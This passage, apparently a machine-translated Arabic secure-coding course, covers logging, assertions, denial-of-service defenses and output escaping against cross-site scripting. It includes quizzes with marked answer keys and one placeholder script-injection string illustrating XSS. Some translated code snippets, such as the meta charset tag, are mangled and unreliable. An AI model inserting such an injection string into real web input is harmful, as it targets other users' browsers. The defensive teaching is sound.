معالجة الأخطاء هي حقيقة من حقائق الحياة ، ولكن عليك التأكد من أن معالجة الأخطاء (وليس فقط خطك "الرئيسي") آمنة. من السهل نسيان اكتشاف الأخطاء أو التعامل معها. حيثما أمكن ، حاول استخدام الأساليب التي من المرجح أن تعمل بشكل صحيح *حتى* عندما يتم تغيير البرنامج من قبل الآخرين.

#### اختبار 3.6: معالجة الأخطاء

\>\>حدد كل العبارات الحقيقية.<<

[!x] من المشكلات الشائعة في رموز الإرجاع التقليدية أنه من السهل نسيان التحقق من الخطأ.

[ ] يجب عليك التقاط جميع الاستثناءات التي تثيرها الأساليب / الوظائف التي تتصل بها. {{ محدد: لا، يجب أن تحصل على استثناء فقط إذا كنت تعرف ما ستفعله به. }}

[x] إذا تم رفع استثناء على طول الطريق إلى "أعلى" البرنامج (على سبيل المثال ، حلقة الحدث الخاصة به) ، فيجب عليك عادة تسجيل هذا الاستثناء ، ثم تحديد ما إذا كان البرنامج سيتوقف أو يستمر.

### تسجيل

أفضل طريقة للتعامل مع الهجمات هي منعها من أن يكون لها أي تأثير. للأسف ، كما أشرنا سابقا ، في بعض الأحيان يمر المهاجمون بتدابير الوقاية الخاصة بنا. في هذه الحالات ، نحتاج إلى اكتشاف الهجوم ثم التعافي منه. يعد الاكتشاف أمرا حيويا ، لأننا غالبا لن نعرف كيفية بدء الاسترداد حتى نكتشف مشكلة.

الآلية الرئيسية التي تمكن من الكشف هي نوع من نظام التسجيل. يمكن بعد ذلك مراقبة السجلات ، إلى جانب مؤشرات أخرى ، للكشف عن الهجمات المستمرة. في الممارسة العملية ، غالبا ما يتم إرسال السجلات من تطبيقات مختلفة إلى بعض القدرات المركزية المحمية لتبسيط التحليل (لأن كل هذه البيانات ستكون في مكان واحد) وحماية محفوظات السجل حتى عند تخريب التطبيق. لن تغطي هذه الدورة التدريبية على وجه التحديد كيفية مراقبة السجلات لاكتشاف الهجمات الناجحة. بدلا من ذلك ، سنركز على كيفية إرسال المعلومات إلى السجلات لتمكين الآخرين (البرامج والبشر) من القيام بهذا الكشف.

عند إنشاء تطبيق ، يجب عليك عموما إرسال بيانات مفصلة إلى السجلات بدلا من الكشف عن تفاصيل المشكلة للمستخدمين غير الموثوق بهم. لا بأس أن نقول إن هناك مشكلة ، لكن لا تقل الكثير. يحب المهاجمون ذلك عندما تقدم لهم بيانات مفصلة حول هجماتهم! يجب أن تسجل السجلات بشكل عام الأحداث المهمة ، بما في ذلك نجاحها أو فشلها. تتضمن الأمثلة نجاحات تسجيل الدخول وفشل تسجيل الدخول وعمليات تسجيل الخروج. قم أيضا بتضمين أي شيء قد يشير إلى هجوم أو محاولة للتغلب على الدفاعات. تأكد من توفير فئات أو مستويات أهمية مختلفة بحيث يمكن التحكم في مقدار معلومات التسجيل في وقت التشغيل.

نظرا لأن التسجيل مهم جدا ، تستخدم العديد من التطبيقات نوعا من نظام التسجيل الذي تنفذه مكتبة أو تطبيق خارجي. عادة ، يجب أن تحاول إعادة استخدام أنظمة السجل الحالية ؛ هذا أقل رمزا للكتابة ، وأسهل في التكامل مع الأنظمة الأخرى ، وما إلى ذلك. إذا كان يجب عليك تنفيذ نظامك الخاص ، فيجب عليك عموما تسجيل التاريخ / الوقت لكل حدث (بدقة أقل من الثانية) ، والمصدر (الجهاز والتطبيق) ، والفئة ، وتفاصيل حول الحدث.

مرة أخرى ، يعد التسجيل آلية أمان يمكن أن تصبح في حد ذاتها ثغرة أمنية. لذلك لديك نظام تسجيل في تطبيق أكبر ، ولكن قم بتنفيذه بطريقة تقاوم نقاط الضعف المحتملة هذه.

غالبا ما تتضمن بيانات السجلات بيانات من مستخدمين غير موثوق بهم، وقد يقوم المهاجمون عن قصد بإنشاء بيانات لمهاجمة نظام التسجيل أو الأنظمة اللاحقة التي تعالج بيانات السجل. قد يحاولون إدخال البيانات التي ستتعطل أو تستحوذ على نظام التسجيل أو تزوير إدخالات السجل أو إنشاء هجمات على نظام استرداد السجل. يعد تزوير السجلات مشكلة شائعة بشكل خاص ، ولا تريد إنشاء نظام يسمح للمهاجمين بتأطير الآخرين. لحل هذه المشكلة ، تحتاج إلى التأكد من أن جميع البيانات غير الموثوق بها المرسلة إلى السجل سيتم هروبها أو تعقيمها عند تخزينها. تقوم العديد من واجهات برمجة تطبيقات التسجيل بذلك بالفعل - تأكد من أنها تفعل ذلك ، وإذا كان لديك خيار ، فتفضل بشدة استخدام واجهات برمجة التطبيقات التي تقوم بذلك نيابة عنك. إذا لم يكن لديك خيار، ففكر في تنفيذ *غلاف* لترميز بيانات السجل تلقائيا وبأمان بحيث يتم منع المشكلة تلقائيا.

الحد بشكل كبير من يمكنه قراءة السجلات ؛ بشكل عام لا ينبغي أن تكون قابلة للقراءة من قبل الجميع. ومع ذلك ، حتى القيام بذلك لا يكفي.

كقاعدة عامة ، لا تقم بتضمين كلمات مرور أو بيانات حساسة للغاية في السجلات. نظرا لأن الأشخاص قد يحتاجون إلى مراجعة السجلات لاحقا ، فإن بيانات السجل تصل أحيانا إلى عدد أكبر من الأشخاص مما قد تتوقعه. في بعض الأحيان يتم الكشف عن السجلات للآخرين ، وقد يستخدم المستلم السجلات بطرق غير مصرح بها. احذر من تضمين البيانات إذا كانت قد تتضمن كلمات مرور أو مفاتيح خاصة! إذا كان يجب عليك تضمين بيانات يحتمل أن تكون حساسة، ففكر في تسجيل البيانات كقيمة مشفرة أو مجزأة بشكل مشفر، بحيث لا يمكن للأشخاص الذين يتلقون السجل استخدامه بسهولة بطريقة غير مصرح بها.

 *فشل تسجيل ومراقبة الأمان* هو 2021 OWASP Top 10 # 9. * عدم كفاية التسجيل والمراقبة* هو 2017 OWASP Top 10 # 10. * يعد تضمين المعلومات الحساسة في ملفات السجل*  ، [CWE-532](https://cwe.mitre.org/data/definitions/532.html) ، سببا شائعا للثغرات الأمنية لدرجة أنه 2021 CWE Top 25 # 39 و 2019 CWE Top 25 # 35.

#### اختبار 3.7: التسجيل

\>\>حدد كل العبارات الحقيقية.<<

[!] بشكل عام ، يجب أيضا عرض المعلومات المسجلة للمستخدم الذي قام بتشغيلها لتسريع تصحيح الأخطاء {{ محدد: بالتأكيد لا ؛ قد تحتوي السجلات على معلومات حساسة أو سرية ، وغالبا ما لا يتم الوثوق بالمستخدمين بشكل كامل. بدلا من ذلك ، أبلغ المستخدم بما يحتاج المستخدم إلى معرفته (على سبيل المثال ، "لم تنجح العملية" ... ووضع التفاصيل في السجلات. }}

[ ] غالبا ما يكون التسجيل غير ضروري لأنه من الأفضل تطوير نظام غير معرض للخطر في المقام الأول. {{ محدد: من الرائع تطوير نظام بدون ثغرات أمنية. نظرا لعدم وجود طريقة للتأكد تماما من صحة ذلك ، نحتاج إلى التسجيل لتمكين اكتشاف المشكلة ، حتى نتمكن بعد ذلك من الاستجابة للمشكلة. }}

[x] يجب أن تتضمن السجلات بشكل عام مزيدا من التفاصيل ، ولكن احذر من تضمين كلمات المرور والمفاتيح الخاصة ، نظرا لأن السجلات تكون مرئية أحيانا للعديد من الآخرين. إذا كان يجب عليك تضمين هذه البيانات ، ففكر في تضمينها كقيمة مشفرة أو مجزأة بشكل مشفر.

[x] قد يحتاج نظام السجل الخاص بك إلى تسجيل البيانات من مهاجم ، لذا تأكد من أن نظام التسجيل الخاص بك ليس عرضة لهجوم "تزوير السجل" (حيث يوفر المهاجم بيانات تتسبب في أن يكون السجل المسجل مضللا بطريقة ما).

### رمز التصحيح والتأكيد

في بعض الأحيان تنبع نقاط الضعف من رمز التصحيح والتأكيد. دعونا نتحدث عن ذلك.

#### كود التصحيح

غالبا ما يقوم المطورون بإدخال التعليمات البرمجية فقط للحصول على رؤية لما يجري. على سبيل المثال ، عند تصحيح الأخطاء ، قد يقومون بإدراج عبارات الطباعة. قد يفعلون ذلك أيضا لتبسيط الاختبار أو لمجرد اكتساب الفهم. في حد ذاته ، هذا جيد ، ولكن هناك خطر من ترك رمز التصحيح هذا ممكنا في الإنتاج. من المرجح أن تؤدي هذه إلى عيوب وثغرات أمنية ، حيث لم يكن من المفترض أن تكون موجودة في البرنامج الذي تم إصداره.

لذلك إذا قمت بإدخال رمز التصحيح ، فقم بفصله بطريقة ما بحيث يسهل ** إزالته تلقائيا. لا يهم كيف. يمكن أن تعمل اصطلاحات التسمية وأعلام المترجم وما إلى ذلك ، طالما أنه من السهل القيام بالشيء *الصحيح*.

تتمثل الإستراتيجية الجيدة طويلة المدى في تمكين نظام التسجيل مبكرا ، وإما استخدامه أو تحويل عبارات التصحيح إلى عبارات تسجيل. إذا وجدت أنه من المفيد رؤية المعلومات الآن ، فقد يكون من المفيد رؤيتها لاحقا. هذا يعني أيضا أنه بدلا من الحاجة إلى إزالة رمز التصحيح ، يمكنك بسهولة تمكينه لاحقا ، حتى داخل نظام الإنتاج. يجب أن يقاوم رمز التسجيل هذا الهجوم ، تماما مثل بقية التعليمات البرمجية.

#### التاكيدات

تحتوي العديد من اللغات على عبارات أو تعبيرات "تأكيد" لتوضيح شيء من *المفترض أن* يكون صحيحا دائما في وقت التشغيل. يمكن أن تكون هذه مفيدة للتحقق من سلامة البرنامج أثناء تشغيله. تتضمن الأمثلة ** عبارة ** تأكيد Java ، وبيان تأكيد Python ،  وماكرو C / C ++ / Rust **assert ()** ، وطريقة ****تأكيد () .js JavaScript Node **** . في معظم اللغات ، إذا فشل التأكيد في وقت التشغيل ، طرح استثناء.

غالبا ما تكون التأكيدات رائعة ، لأنها يمكن أن توقف المشاكل قبل أن تصبح أكثر خطورة. ومع ذلك ، إذا تمكن أحد المهاجمين من التسبب في فشل التأكيد ، فقد يؤدي ذلك إلى إنهاء التطبيق أو سلوك آخر أكثر خطورة من اللازم. وعلى وجه الخصوص، حيثما كان ذلك عمليا:

* تجنب السماح للمهاجم بتشغيل تأكيد. على وجه الخصوص ، *لا تستخدم أبدا* التأكيدات للتحقق من صحة المدخلات غير الموثوق بها. هناك سببان وجيهان على الأقل:

    1. مكافحة مدخلات المهاجم هو  سلوك *متوقع*!

    2. غالبا ما يمكن تعطيل التأكيدات باستخدام علامات المترجم أو وقت التشغيل. هذا ينتهك مبدأ التحقق من صحة المدخلات غير القابلة للتجاوز للأمان ، لأن نهج التحسين المعقول تماما يمكن أن يعطل عن طريق الخطأ حاجة أمنية حيوية.

* قصر نطاق استجابة التأكيد (معالج الاستثناء) على جلسة عمل المهاجم حيث يمكنك. على سبيل المثال ، حاول تعطيل هذا الاتصال فقط ، وليس جميع الاتصالات ، إذا فشل التأكيد.

 *يعد التأكيد القابل* للوصول  (تأكيد يمكن للمهاجم تشغيله) ، [CWE-617](https://cwe.mitre.org/data/definitions/617.html) ، سببا شائعا للثغرات الأمنية لدرجة أنه 2019 CWE Top 25 # 40.

يمكن أن يؤدي إدخال التأكيدات إلى جعل تقنية التحقق المسماة "fuzzing" أكثر فعالية. لذلك ، غالبا ما يكون من الجيد أن يكون لديك العديد من التأكيدات ، طالما أنها تعبيرات *يجب أن* تكون صحيحة دائما. سنناقش التشويش بمزيد من التفصيل لاحقا.

#### اختبار 3.8: رمز التصحيح والتأكيد

\>\>حدد كل العبارات الحقيقية.<<

[!x] إذا قمت بإدخال رمز تصحيح الأخطاء ، فاجعل من السهل إزالته تلقائيا أو تحويله إلى بيان تسجيل.

[ ] استخدم تأكيدا لتحديد ما إذا كان الإدخال غير الموثوق به يفي بمعايير الإدخال.

[x] يمكن أن تجعل التأكيدات تقنيات التحقق الأخرى أكثر فعالية.

### مكافحة هجمات الحرمان من الخدمة (DoS)

يجب أن تكون الأنظمة الآمنة متاحة للمستخدمين المصرح لهم حتى أثناء تعرضهم للهجوم. هذا صعب بشكل خاص إذا كان من الممكن الوصول إلى نظامك عبر الإنترنت العام. قد يتمكن المهاجمون من شن هجوم DoS (DDoS) موزع من العديد من الأنظمة التي يسيطرون عليها ، مما يؤدي إلى إنشاء ملايين أو مليارات الطلبات. إذا كان لدى المهاجم العديد من الموارد، فقد لا تتمكن من مواجهة الهجوم *إلا* باستخدام موارد كبيرة (بما في ذلك المال) للتعامل مع عبء العمل.

تتمثل إحدى الطرق في تصميم نظامك لتتمكن من التعامل مع كميات أكبر من حركة المرور. بهذه الطريقة ، سيتم التعامل مع طلبات المهاجمين ببساطة. صمم نظامك ليكون قابلا للتطوير (على سبيل المثال ، من خلال الحاويات) ونشره على نظام سحابي حيث يمكنك تلقائيا (أو على الأقل بسرعة) التوسع إلى أحجام أكبر بكثير إذا كان هناك طلب. استخدم ذاكرات التخزين المؤقت وشبكات تسليم المحتوى (CDNs) وقلل وقت التنفيذ لكل طلب بحيث يمكن معالجة المزيد من الطلبات كل ثانية. ضع في اعتبارك استخدام موقع ثابت حيث يكون هذا النوع من مواقع الويب خيارا قابلا للتطبيق. هناك العديد من الطرق لتقليل وقت التنفيذ (ويعرف أيضا باسم زيادة الأداء) ؛ بالنسبة للعديد من الأنظمة ، يعد الاستخدام الأقصى لفهارس قاعدة البيانات والتخلص مما يسمى باستعلامات "N + 1" خطوة أولى جيدة.

ومع ذلك ، في مرحلة ما ، سيتمكن المهاجم الذي يتحكم في موارد كافية من التغلب على معظم الخدمات ما لم تكن على استعداد لإنفاق مبلغ كبير من المال للتعامل معها. لذا فإن النهج الآخر هو التعافي بسرعة من الطلب المفرط الذي يسببه المهاجمون. تأكد من إمكانية إعادة التشغيل تلقائيا وأن نظامك يمكن إعادة تشغيله بسرعة نسبيا. عندما يكون ذلك معقولا ، لديك وضع "تراجع" (على سبيل المثال ، وضع للقراءة فقط أو خدمة منفصلة) بحيث  تتوفر *بعض* الخدمات أثناء هجوم عدواني.

هناك طريقة أخرى لجعل هجمات DoS أكثر صعوبة وهي تقليل كمية الموارد التي يتطلبها تطبيقك. إذا كانت الموارد مطلوبة مؤقتا (على سبيل المثال ، مقابض الملفات ، وما إلى ذلك) ، فتأكد من التحكم في تخصيصها واستهلاكها وإعادتها عند عدم الحاجة إليها. بالإضافة إلى ذلك ، تجنب "فقدان" الموارد. الذاكرة هي مورد تتم إدارته تلقائيا بواسطة العديد من اللغات ، ولكن العديد من الموارد الأخرى لا تضيع أو تضيع بسهولة. إذا كان عليك إرجاع مورد يدويا بلغة مع معالجة الاستثناءات، فتأكد من إرجاع الموارد *حتى* عند طرح استثناء.

 هناك عدة أنواع من نقاط الضعف في التعامل مع الموارد (ذات الصلة) ، ويمكن أن يؤدي أي منها في النهاية إلى رفض الخدمة. ما هو أكثر من ذلك ، فهي مشاكل شائعة:

* *يعد استهلاك الموارد غير المنضبط* ([CWE-400](https://cwe.mitre.org/data/definitions/400.html)) سببا شائعا للثغرات الأمنية لدرجة أنه 2021 CWE Top 25 # 27 و 2019 CWE Top 25 # 20.

* يرتبط هذا ارتباطا وثيقا بوجود إصدار مفقود من الموارد ، 2019 CWE Top 25 # 21  ، [CWE-772 ](https://cwe.mitre.org/data/definitions/772.html)، *الإصدار المفقود للمورد بعد العمر الفعال*.

* *يعد تخصيص الموارد بلا حدود أو الاختناق* ([CWE-770](https://cwe.mitre.org/data/definitions/770.html)) سببا شائعا للثغرات الأمنية لدرجة أنه 2021 CWE Top 25 # 40 و 2019 CWE Top 25 # 39.

مشكلة واضحة ولكنها شائعة بشكل مدهش هي الحلقات حيث يمكن للمهاجم أن يتسبب في عدم حدوث حالة الخروج أبدا ، مما يتسبب في تعطل البرنامج في حلقة لا نهائية دون إنجاز العمل.

 الحلقات ذات ظروف الخروج التي لا يمكن الوصول إليها هي 2019 CWE Top 25 # 26 ، [CWE-835](https://cwe.mitre.org/data/definitions/835.html).

تأكد من أن لديك نسخا احتياطية من مجموعات البيانات المهمة وعملية استرداد عملية. بهذه الطريقة ، إذا تمكن المهاجم من إيقاف تشغيل النظام بأكمله ، تقليل فقدان البيانات إلى الحد الأدنى. إذا لزم الأمر ، يمكنك حتى إعادة تشغيل الخدمة في مكان آخر أو في شكل آخر باستخدام النسخ الاحتياطية. يجب أن يكون لديك نسخ احتياطية متعددة ، ويجب أن تكون بعض النسخ القديمة على الأقل في *التخزين البارد* (أي أنه لا يمكن تعديل النسخ الاحتياطية عن طريق هجوم كمبيوتر لاحق). بهذه الطريقة ، إذا كانت النسخ الاحتياطية الأحدث تالفة من قبل أحد المهاجمين (مثل استخدام هجوم برامج الفدية) ، فهناك نسخ احتياطية لا يزال من الممكن استخدامها.

#### اختبار 3.9: مكافحة هجمات الحرمان من الخدمة (DoS)

\>\>حدد جميع الأساليب التي قد تساعد في مواجهة هجمات رفض الخدمة (DoS) إذا كانت خدمتك متاحة على الإنترنت العام:<<

[!x] تقليل وقت التنفيذ لكل طلب.

[x] استخدم شبكة توصيل المحتوى (CDN).

[x] منع فقدان الموارد التي يتطلبها النظام.

[x] تقليل الوقت اللازم لإعادة تشغيل النظام.

[ ] لا شيء مما سبق

# إرسال الإخراج

يصف هذا الفصل كيفية إرسال الإخراج بشكل آمن، بما في ذلك كيفية مواجهة هجمات البرمجة النصية عبر المواقع (XSS)، واستخدام رؤوس تصلب HTTP، واستخدام أنظمة التنسيق بشكل آمن.

أهداف التعلم:

1. ناقش كيفية إرسال الإخراج بشكل آمن.

2. شرح كيفية مواجهة هجمات البرمجة النصية عبر المواقع (XSS).

3. استخدم رؤوس تقوية HTTP ، بما في ذلك سياسة أمان المحتوى (CSP).

4. شرح كيفية منع الثغرات الأمنية الشائعة الأخرى المتعلقة بالمخرجات في تطبيقات الويب.

5. فهم كيفية استخدام سلاسل التنسيق والقوالب بأمان.

6. فهم كيفية معالجة نقاط الضعف الشائعة الأخرى المتعلقة بالمخرجات.

### مقدمة في إرسال الإخراج

في النهاية ، تحتاج البرامج إلى إرسال الإخراج إلى مكان ما. يمكن أن يكون ردا على طلب أو عرضا لمستخدم أو تخزين معلومات في قاعدة بيانات أو أي شيء آخر يرجع نتيجة.

كل ما تعلمناه عن إرسال المعلومات إلى برامج أخرى ينطبق هنا أيضا. على سبيل المثال ، ستحتاج غالبا إلى تعقيم و / أو الهروب و / أو تطبيع الإخراج الذي ترسله إلى بعض المستخدمين.

القاعدة الأساسية السريعة هي أنه يجب عليك محاولة تقليل المعلومات التي يعرضها برنامجك لمستخدم غير موثوق به ، خاصة إذا كانت متعلقة بالأمان:

* إذا كان البرنامج يتطلب نوعا من مصادقة المستخدم (مثل العديد من المصادقات المزودة باتصال شبكة)، فامنح المستخدم أقل قدر ممكن من المعلومات قبل المصادقة. على وجه الخصوص ، تجنب التخلي عن رقم إصدار البرنامج الخاص بك قبل المصادقة ، ما لم يكن من السهل العثور عليه على أي حال أو كان هو المثيل الوحيد للبرنامج. بخلاف ذلك ، إذا تم العثور على ثغرة أمنية في إصدار معين من برنامجك ، فإن المستخدمين الذين لا يقومون بالترقية من هذا الإصدار يعلنون للمهاجمين أنهم معرضون للخطر.

* إذا فشل تسجيل الدخول ، لاحظ أنه فشل ، ولكن بشكل عام لا تذكر السبب. على سبيل المثال ، لا تقل أن اسم المستخدم خاطئ ، إلا إذا كان بإمكان المهاجم الحصول على أسماء المستخدمين على أي حال كمعلومات عامة. لا تقل أبدا أن كلمة المرور صحيحة "تقريبا" ؛ صحيح أو غير صحيح.

* لا تظهر كلمات المرور على الشاشة بشكل افتراضي. على سبيل المثال ، في HTML ، استخدم نوع بيانات "كلمة المرور" ، لأن ذلك عادة ما يستبدل كل حرف كلمة مرور بنقطة. خلاف ذلك ، يمكن للمهاجم الذي يتصفح الكتف خلف المستخدم الحصول على هذه المعلومات ، أو قد يتم الكشف عن المعلومات عن طريق الخطأ من قبل مستخدم يصنع مقطع فيديو.

* إذا كان يجب عليك عرض بعض المعلومات الحساسة في نموذج ، فاجعلها صفحة منفصلة أو لديك زر يمكنه إخفاء / الكشف عن تلك المعلومات. حاول أن تجعل إخفاء المعلومات الحساسة هو الإعداد الافتراضي. مرة أخرى ، يساعد هذا في مواجهة تصفح الكتف والكشف العرضي عن المعلومات.

* تقليل تعليقات التعليمات البرمجية المضمنة المرسلة إلى المستخدمين ؛ يؤدي هذا إلى إهدار حركة مرور الشبكة وقد يكشف عن المعلومات عن طريق الخطأ. إذا كنت تستخدم JavaScript ، يمكن أن يساعد التصغير في منع ذلك.

يجب أن يكون برنامجك مستعدا أيضا للتعامل مع المهاجمين الذين يرفضون عمدا أو يقبلون الإخراج ببطء شديد. خلاف ذلك ، قد يتمكن المهاجم من جعل برنامجك لا يستجيب للمستخدمين الآخرين ، وذلك ببساطة عن طريق انسداد بعض الإخراج. عادة ما تكون التطبيقات التي تستخدم الاتصالات غير المتزامنة أقل عرضة لذلك ، ولكن أي تطبيق *يمكن أن* يواجه هذه المشكلة. بشكل أساسي ، تأكد من أن المهاجم لا يمكنه سد النظام عن طريق إيقاف أو إبطاء متصفح الويب الخاص به ، ووجود اتصال TCP / IP بطيء عن قصد ، وما إلى ذلك. باختصار ، لا تخلق فرصة سهلة لهجوم رفض الخدمة. إليك بعض النصائح:

* حرر الأقفال بسرعة ، ويفضل قبل الرد بأي ** إخراج.

* استخدم المهلات في عمليات الكتابة الموجهة نحو الشبكة.

* قم بقياس الوقت من بداية محاولتك - لا بأس من التوقف في المنتصف إذا كان بطيئا بشكل مثير للريبة.

يجب عليك اتباع الاتفاقيات الدائمة للنظام الذي تستخدمه حيثما أمكن ذلك ، نظرا لأن المكونات الأخرى غالبا ما تعتمد على ذلك. على وجه الخصوص ، على الويب ،  يجب ألا تتخذ طرق **GET** و **HEAD** الخاصة ب HTTP أي إجراء دائم من تلقاء نفسها ؛ يجب أن تكون مجرد استرجاع للمعلومات. **** يمكن أن تحدث طريقة GET ، على وجه الخصوص ، بنقرة بسيطة على ارتباط تشعبي في صفحة ثابتة ، ويجب ألا تتضمن أي شيء دائم مثل الشراء أو البيع. بدلا من ذلك ، استخدم طرقا أخرى (مثل **POST**  و **PUT** و **DELETE**) للإشارة إلى التغييرات الدائمة. لا يمكن لبروتوكول HTTP فرض ذلك ، ولكنه الاصطلاح القياسي ، وتفترضه العديد من الأدوات ، لذلك يجب عليك أيضا تطبيق هذه القاعدة حيثما كان ذلك عمليا.

تأكد من إخبار المتلقي بالضبط بكيفية تفسير الإخراج. خلاف ذلك ، إذا كان يتضمن بيانات من مهاجم ، فقد يتمكن المهاجم من خداع المستلم لتفسيرها بطريقة خاطئة. هذه مشكلة شائعة بشكل خاص في تطبيقات الويب:

* اذكر بوضوح نوع MIME للبيانات التي يتم إرسالها. يمكن للمتصفحات أن تخمن ، لكنها قد تخمن خطأ.

* اذكر بوضوح ترميز الأحرف للإخراج الذي يتم إرساله. لا تجعل برنامج الاستقبال يخمن ترميز الأحرف! إذا كان على برنامج الاستقبال (عادة متصفح الويب) أن يخمن ، فقد يخدع المهاجم نظامك لإرسال مواد تؤدي إلى تخمين خاطئ وفي النهاية هجوم. إذا كنت ترسل HTML ، فعادة ما يجب عليك إخبار المستلم أنه UTF-8. أفضل طريقة للقيام بذلك هي عبر  خيار **مجموعة أحرف** HTTP  ، والذي يمكنك القيام به غالبا باستخدام خيار تكوين بسيط. إذا لم تتمكن من التحكم في ذلك لسبب ما ، فقم بتضمين هذه المعلومات في HTML **&lt ؛ head> ، **على سبيل المثال ، **&lt ؛ meta http-equiv = "نوع المحتوى" المحتوى = "نص / html ؛ charset = UTF-8">** .

بشكل عام ، غالبا ما تحتاج إلى **_الهروب من مخرجاتك_** حتى لا تصبح أي بيانات تنشئها قد تتأثر بالمهاجم هجوما. هذه مشكلة شائعة بشكل خاص في تطبيقات الويب. تسمى إحدى نقاط الضعف الأكثر شيوعا في تطبيقات الويب  البرمجة *النصية عبر المواقع* (XSS). هذه المشكلة هي كل شيء عن عدم إرسال الإخراج بشكل صحيح ، وعلى وجه الخصوص ، حول الهروب من الإخراج بشكل صحيح. ستشرح الوحدة التالية الثغرة الأمنية وكيفية التعامل معها.

#### اختبار 4.1: مقدمة في إرسال الإخراج

\>\>لا تضيع المساحة في إخبار متصفح الويب المتلقي بنوع البيانات أو الترميز الذي يتم إرساله ، حيث تقوم المتصفحات بعمل ممتاز في تحديد هذه المعلومات تلقائيا. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

هذا غير صحيح. تقوم متصفحات الويب بعمل ممتاز في تحديد هذه المعلومات تلقائيا عندما لا يكون هناك هجوم ، ولكن يمكن للمهاجمين أن يكونوا ماكرين للغاية في توفير البيانات المصممة خصيصا لخداع الاستدلال على برامج الاستقبال. بدلا من ذلك ، في حالة وجود خيارات ، يجب عليك إرسال معلومات إلى المستلمين لإخبارهم بالضبط بكيفية تفسير البيانات ، مثل نوع البيانات وترميزها.

[تفسير]

### مكافحة البرمجة النصية عبر المواقع (XSS)

[تطبيق ويب]

#### مشكلة XSS

واحدة من أكثر نقاط الضعف شيوعا في تطبيقات الويب هي ثغرة أمنية في البرمجة النصية عبر المواقع (XSS). في هجوم XSS ، يحاول المهاجم خداع متصفح الويب للقيام بشيء ضار (عادة لتشغيل تعليمات برمجية ضارة) عن طريق إدخال معلومات في صفحة ويب صالحة أو تطبيق ويب سيساء تفسيره بواسطة المتصفح المتلقي على أنه نوع من الإجراءات الضارة. يتم اختصاره دائما ك XSS ، لأن CSS له بالفعل معنى آخر (أوراق الأنماط المتتالية). XSS هي مشكلة شائعة بشكل خاص في الصفحات أو المواقع التي تسمح بتعليقات المستخدمين ، لأن تعليقات المستخدم هي ناقل سهل للمهاجمين لإدراج معلوماتهم الضارة.

المشكلة الأساسية هي أن متصفحات الويب (التي تعمل كعملاء) يجب أن تفترض أنه إذا تم إرسال بعض البيانات ، فإن المرسل ينوي إرسالها. بعد كل شيء ، ما الذي يمكن أن يفترضه متصفح الويب أيضا؟ ومع ذلك ، إذا قام المرسل بإنشاء تلك البيانات من خلال الجمع بين البيانات الثابتة التي يتحكم فيها مع البيانات المقدمة من المهاجم ، ولم يتم تطهير البيانات المقدمة من المهاجم بشكل صحيح ، فقد تصبح المجموعة ضارة. سيتم بعد ذلك تفسير مزيج هذه المجموعة بواسطة متصفح الويب على أنه طلب للقيام بشيء ضار ، وهو ما يفعله بعد ذلك.

على سبيل المثال ، إذا أرسل خادم الويب HTML مضمنا بسلسلة من مستخدم غير موثوق به ، وقام مهاجم بترتيب هذه السلسلة لتحتوي <**script> do_something_malicious();  </script>**، قد ينتهي المستخدم بتشغيل برنامج JavaScript **do_something_malicious()**.

في XSS ، النظام الذي يتم مهاجمته في النهاية هو *متصفح الويب*. ومع ذلك ، فإن *سبب* الهجوم هو رمز غير صحيح مكتوب في *مرسل* البيانات إلى متصفح الويب. هناك ثلاثة أنماط شائعة ل XSS:

* **مخزن دائم**<br>يتم تخزين البيانات الضارة في قاعدة بيانات لاسترجاعها لاحقا. على سبيل المثال ، يرسل المهاجم تعليقا يحتوي على برنامج نصي ضار مضمن ؛ عندما يستخدم شخص آخر مستعرض الويب الخاص به لعرض التعليقات ، يقوم متصفح الويب بتشغيل البرنامج النصي الضار.

* **انعكاس**<br>يتم إرسال البيانات الضارة بواسطة متصفح الويب الخاص بالضحية إلى الخادم (عادة داخل عنوان URL) وتنعكس على الفور مرة أخرى إلى المتصفح.

* **مستند**<br> إلى DOM يرسل عميل الويب بيانات الهجوم إلى نفسه ، عادة باستخدام البيانات المقدمة من هجوم ثم إرسالها عبر DOM باستخدام JavaScript.

 XSS هو خطأ شائع في تطبيقات الويب لدرجة أنه 2017 OWASP Top 10 # 7. يعتبر XSS جزءا من 2021 OWASP Top 10 # 3 (حقن) في نسخته لعام 2021. إنه أيضا 2019 CWE Top 25 # 2 و 2021 CWE Top 25 # 2. في  CWE هو [CWE-79 ](https://cwe.mitre.org/data/definitions/79.html)، *التحييد غير الصحيح للإدخال أثناء إنشاء صفحة الويب ("البرمجة النصية عبر المواقع").*

#### حل XSS: إخراج الهروب

الطريقة القياسية لمواجهة XSS هي الهروب من جميع المخرجات التي قد تكون من مهاجم ولم تتم الموافقة عليها على وجه التحديد. من نواح كثيرة ، هذا هو أفضل إجراء مضاد. إذا تم ذلك بشكل صحيح ، فإنه يتصدى تماما للهجوم وهو مرن للغاية. على سبيل المثال، إذا كانت لديك بيانات HTML غير موثوق بها من مهاجم، فقم بتطبيق عمليات الهروب القياسية بتنسيق HTML ما لم يكن لديك سبب وجيه للقيام بخلاف ذلك:

**هروب HTML القياسي**

<table>
  <tr>
    <td>اللغة الأصلية</td>
    <td> هروب HTML</td>
  </tr>
  <tr>
    <td> &</td>
    <td> &amp;</td>
  </tr>
  <tr>
    <td> <</td>
    <td> &lt;</td>
  </tr>
  <tr>
    <td> ></td>
    <td> &gt;</td>
  </tr>
  <tr>
     <td>"</td>
    <td> &quot;</td>
  </tr>
  <tr>
     <td>'</td>
    <td> &#39; أو &apos;</td>
  </tr>
</table>


في تعقيم المخرجات ، تماما مثل التحقق من صحة الإدخال ، غالبا ما يكون من الأفضل تحديد قائمة مسموح بها والهروب من الباقي. ومع ذلك ، في بعض الأحيان تكون عمليات الهروب من الإخراج المطلوبة قائمة محددة جيدا يمكنك تطبيقها مباشرة ، لأنه في بعض الأحيان يمكنك ** تعداد الفئات بأمان كما فعلنا هنا ل HTML. هناك حالات من الناحية الفنية لا يتعين عليك فيها تطبيق عمليات الهروب على البيانات غير الموثوق بها ، ولكن في HTML غالبا ما يكون من الأسهل والأسرع تطبيقها جميعا تلقائيا ما لم تكن لديك حاجة محددة للسماح بشيء آخر. بالطبع ، هذه ليست سوى الهروب ل HTML نفسها. هذه ليست كافية في حد ذاتها لتنسيقات البيانات الأخرى (مثل عناوين URL المضمنة ورؤوس HTTP).

